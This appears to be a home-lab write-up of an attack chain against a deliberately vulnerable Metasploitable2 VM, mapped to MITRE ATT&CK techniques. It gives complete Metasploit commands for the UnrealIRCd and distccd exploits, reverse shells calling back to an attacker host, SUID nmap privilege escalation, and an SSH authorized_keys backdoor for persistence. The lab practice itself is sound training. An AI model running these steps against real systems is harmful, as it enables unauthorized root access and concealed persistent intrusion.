# Metasploitable Attack Chain: Initial Access → Privilege Escalation → Persistence

This document walks through a full attack chain executed against the Metasploitable2 target VM (192.168.94.131) in this lab, from initial foothold through privilege escalation to persistence. Two separate initial access paths are documented, since they demonstrate different attacker techniques.

## Target Overview

- **OS:** Ubuntu 8.04 (Linux kernel 2.6.24-16-server), i686
- **Purpose:** Intentionally vulnerable training target — deliberately unpatched, weak credentials, backdoored services
- **Network:** Isolated on the lab's NAT subnet (192.168.94.0/24) only — never connected to Tailscale or any external network

A full port scan (`nmap -sV -p- 192.168.94.131`) revealed 20+ open services, several with known critical vulnerabilities. See `METASPLOITABLE_PORT_SCAN.txt` for the raw scan output.

---

## Path 1: Initial Access via UnrealIRCd Backdoor (Instant Root)

**Service:** UnrealIRCd on ports 6667/6697
**Vulnerability:** CVE-2010-2075 — in 2009–2010, the official UnrealIRCd download server was compromised and a backdoor was injected into the source. Any connection sending the string `AB` followed by a shell command causes that command to execute as root.

### Exploitation

```
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.94.131
set LHOST 192.168.94.130
run
```

### Result

```
[*] Meterpreter session 1 opened (192.168.94.130:4444 → 192.168.94.131:40850)
```

```
meterpreter > getuid
Server username: root
```

**Note:** This exploit lands as root immediately — there is no privilege escalation to demonstrate here, since the backdoor itself executes commands with root's privileges. This is a clean, complete "initial access via supply-chain backdoor" story on its own, but a second path was needed to demonstrate genuine privilege escalation.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application (Initial Access)

---

## Path 2: Low-Privilege Foothold → Privilege Escalation

To demonstrate a realistic escalation story, a second entry point was used that grants only a low-privilege shell.

### Step 1: Initial access via distccd

**Service:** distccd (distributed compiler daemon) on port 3632
**Vulnerability:** distccd will execute any command handed to it without authentication. Unlike the UnrealIRCd and vsftpd backdoors on this box (both of which hand out root directly), distccd runs as the unprivileged `daemon` account — making it the correct choice for a genuine low-privilege starting point.

```
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.94.131
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.94.130
run
```

Result: `Command shell session 2 opened`

```
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
whoami
daemon
```

### Step 2: Upgrade to a full Meterpreter session

The privilege escalation module needed later refused to run against the plain shell (`incompatible session platform: unix`). Upgraded using Metasploit's built-in helper:

```
use post/multi/manage/shell_to_meterpreter
set SESSION 2
set LHOST 192.168.94.130
run
```

Result: `Meterpreter session 3 opened` — daemon @ metasploitable.localdomain

### Step 3: Enumerate escalation paths

```
uname -a
→ Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

find / -perm -u=s -type f 2>/dev/null
```

The SUID search returned a list of standard system binaries plus `/usr/bin/nmap` — which turned out to be the key finding.

An initial attempt at a known kernel-level exploit (`exploit/linux/local/udev_netlink`, targeting CVE-2009-1185) failed with a Ruby error in the module itself (`NoMethodError undefined method 'length' for nil`) — a known issue with that module in current Metasploit versions, unrelated to the target. Rather than continue debugging a broken module, Metasploit's automated suggester was used instead:

```
use post/multi/recon/local_exploit_suggester
set SESSION 3
run
```

Several candidates were flagged as "appears to be vulnerable," but only one was confirmed outright:

```
exploit/unix/local/setuid_nmap   Yes   "The target is vulnerable. /usr/bin/nmap is setuid"
```

### Step 4: Exploit — SUID nmap privilege escalation

**Vulnerability:** Older versions of nmap included an `--interactive` mode with a raw shell-command escape (originally intended for scripting convenience). If the nmap binary has the SUID bit set and is owned by root, that escape shell inherits root's effective privileges — turning a "harmless" scanner into a local root exploit.

Getting a working session required several rounds of payload troubleshooting, documented here because the debugging process is as instructive as the final result:

| Attempt | Payload | Result | Root Cause |
|---|---|---|---|
| 1 | `cmd/linux/http/x64/meterpreter/reverse_tcp` (default) | No session created | **Architecture mismatch** — x64 payload against an x86 (32-bit) target |
| 2 | `linux/x86/meterpreter/reverse_tcp` | "not a compatible payload" | Module requires a `cmd/`-prefixed command-stager payload, not a plain `linux/x86` one |
| 3 | `cmd/linux/http/x86/meterpreter_reverse_tcp` | `bad-config: Prepend options only work with PayloadLinuxMinKernel = 3.17` | Default payload options call `setuid(0)` via a syscall method only available on kernel ≥3.17; target kernel is 2.6.24 (2008) |
| 4 | Same, with `PrependSetuid`/`PrependSetresuid`/`PrependSetgid`/`PrependSetresgid` all set `false` | Ran cleanly, but still no session | HTTP-fetch-based payload staging (target reaches back out over HTTP for the real payload) never completed against this target/network |
| 5 (working) | `cmd/unix/reverse` | **Session created** | Simple, direct, single-hop reverse shell — no HTTP fetch dependency |

Final working command:
```
use exploit/unix/local/setuid_nmap
set SESSION 3
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.94.130
run
```

Result: `Command shell session 4 opened`

### Confirmed escalation

```
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
whoami
root
```

This output is the textbook signature of a SUID exploit: the **real** user ID (`uid`) is still `daemon`, but the **effective** user ID (`euid`) is `0` (root) — the privilege the OS actually grants for permission checks. `whoami` reports root because it checks the effective ID.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid/Setgid (Privilege Escalation)

---

## Persistence: SSH Authorized Key Backdoor

With root access established, a standing backdoor was added so future access doesn't depend on re-running either exploit chain.

### Setup

Generated a fresh SSH key pair on the attacker (Kali) machine:
```bash
ssh-keygen -t rsa -b 2048 -f /tmp/lab_key2 -N ""
```

Transferred the public key to the target and appended it to root's authorized_keys, using Meterpreter's file upload (see note below on why this method was used):
```
upload /tmp/lab_key2.pub /tmp/lab_key2.pub
shell
cat /tmp/lab_key2.pub >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
```

### Verification

```bash
ssh -i /tmp/lab_key2 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.94.131
```

Result: authenticated via publickey, dropped straight to `root@metasploitable:~#` — no password required.

**Note on the `HostKeyAlgorithms`/`PubkeyAcceptedAlgorithms` flags:** Metasploitable's SSH daemon (2008-era) only offers `ssh-rsa`/`ssh-dss` host key algorithms, which modern OpenSSH clients disable by default as insecure. These flags re-enable them for this connection only, without weakening the client's defaults globally.

**Lesson learned — key transfer method matters:** An initial attempt to manually copy and paste the public key text into the target's `authorized_keys` file failed silently — SSH fell back to a password prompt with no clear error on the client side. Checking the target's `/var/log/auth.log` revealed the real cause: `key_read: uudecode ... failed` — the long base64 key string had been corrupted by a dropped or duplicated character during manual copy/paste across a terminal session. Switching to a byte-for-byte file transfer via Meterpreter's `upload` command eliminated the issue entirely. **Takeaway: never hand-type or copy/paste long key material through a terminal if a proper file-transfer method is available.**

**MITRE ATT&CK:** T1098.004 — Account Manipulation: SSH Authorized Keys (Persistence)

---

## Summary — MITRE ATT&CK Mapping

| Attack | Technique ID | Technique Name | Tactic |
|---|---|---|---|
| UnrealIRCd backdoor | T1190 | Exploit Public-Facing Application | Initial Access |
| distccd exploit (low-priv foothold) | T1190 | Exploit Public-Facing Application | Initial Access |
| SUID nmap privilege escalation | T1548.001 | Abuse Elevation Control Mechanism: Setuid/Setgid | Privilege Escalation |
| SSH authorized_keys backdoor | T1098.004 | Account Manipulation: SSH Authorized Keys | Persistence |

## Known Limitations / Follow-Up

- The `udev_netlink` exploit module (targeting CVE-2009-1185) is broken in current Metasploit versions and should not be retried against this target — use `local_exploit_suggester` to find working alternatives instead.
- Metasploitable does not run a Wazuh agent (intentionally — it's the target, not a defender). Detection of activity against it relies entirely on Suricata monitoring network traffic from the Ubuntu Server side.
- Next step: use this foothold for lateral movement against Ubuntu-Server-01 (192.168.94.129), and cross-reference all of the above against Wazuh's Security Events and MITRE ATT&CK dashboard to confirm what was actually detected.
